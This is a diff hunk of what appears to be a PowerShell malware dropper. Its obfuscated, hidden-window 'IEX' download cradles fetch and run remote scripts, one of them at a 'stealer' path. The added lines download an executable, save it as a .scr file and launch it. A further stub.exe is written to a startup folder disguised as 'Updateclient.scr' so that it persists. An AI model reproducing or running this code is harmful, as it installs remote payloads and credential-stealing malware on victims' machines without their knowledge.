@@ -89,13 +89,21 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Me
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/stealer/main.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
+$url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/lmao.exe"
+$output = "$dir\lmao.scr"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process $output
+    Write-Host "Tệp đã được tải về thành công."
+}
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
